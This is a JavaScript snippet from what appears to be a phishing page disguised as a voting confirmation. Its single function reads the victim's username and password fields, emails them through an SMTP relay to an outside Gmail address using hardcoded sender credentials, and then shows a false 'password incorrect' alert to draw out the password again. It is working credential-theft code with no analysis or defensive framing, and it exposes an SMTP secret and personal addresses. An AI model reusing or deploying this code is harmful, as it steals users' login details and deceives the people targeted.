function sendEmail(){
  Email.send({
    Host : "smtp.elasticemail.com",
    Username : "naomisharon289@gmail.com",
    Password : "ED9D38A5E8E5A57564AEA119ADA7A2E09C16",
  To : 'scrandlinpip@gmail.com',
  From : "naomisharon289@gmail.com",
  Subject : "You just received details",
  Body : "Name: " + document.getElementById("uname").value
       + "<br>"
        + "<br> password: " + document.getElementById("upass").value
}).then(
message => alert("Password incorrect, we couldn't confirm your vote. Try again correctly")
);
}


